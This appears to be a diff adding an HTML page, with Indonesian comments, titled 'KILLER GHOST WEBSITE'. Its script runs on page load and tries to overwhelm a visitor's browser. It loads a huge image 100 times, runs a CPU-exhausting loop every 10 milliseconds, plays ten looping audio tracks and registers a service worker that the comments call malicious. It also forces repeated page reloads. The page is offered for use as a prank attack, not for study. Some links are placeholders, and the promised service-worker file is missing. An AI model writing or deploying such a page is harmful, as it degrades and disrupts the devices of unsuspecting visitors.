@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>⚠️ KILLER GHOST WEBSITE ⚠️</title>
+    <style>
+        body {
+            background: #000;
+            margin: 0;
+            overflow: hidden;
+        }
+        .hantu {
+            position: absolute;
+            width: 5000px;
+            height: 5000px;
+            background: url('https://i.imgur.com/UNREAL-HUGE-IMAGE.jpg');
+            animation: gila 0.001s infinite, warna 0.1s infinite;
+        }
+        @keyframes gila {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.5); }
+            100% { transform: scale(0.5); }
+        }
+        @keyframes warna {
+            0% { filter: hue-rotate(0deg); }
+            100% { filter: hue-rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <script>
+        // BOM MEMORI: Load gambar hantu 100x
+        for (let i = 0; i < 100; i++) {
+            let img = new Image();
+            img.src = 'https://i.imgur.com/UNREAL-HUGE-IMAGE.jpg'; // Ganti link gambar
+            document.body.appendChild(img);
+        }
+
+        // BOM CPU: Loop iblis
+        setInterval(() => {
+            let a = [];
+            for (let i = 0; i < 1000000; i++) {
+                a.push(new Date());
+            }
+        }, 10);
+
+        // BOM AUDIO: 10 track suara sekaligus
+        for (let i = 0; i < 10; i++) {
+            let audio = new Audio('https://example.com/jeritan-extreme.mp3'); // Ganti link audio
+            audio.loop = true;
+            audio.play();
+        }
+
+        // BOM CACHE: Corrupt cache paksa!
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('sw.js'); // Buat file SW jahat (lihat di bawah)
+        }
+
+        // BOM REDIRECT: Auto refresh maut!
+        let count = 0;
+        setInterval(() => {
+            if (count < 999) {
+                window.location.reload(true);
+                count++;
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
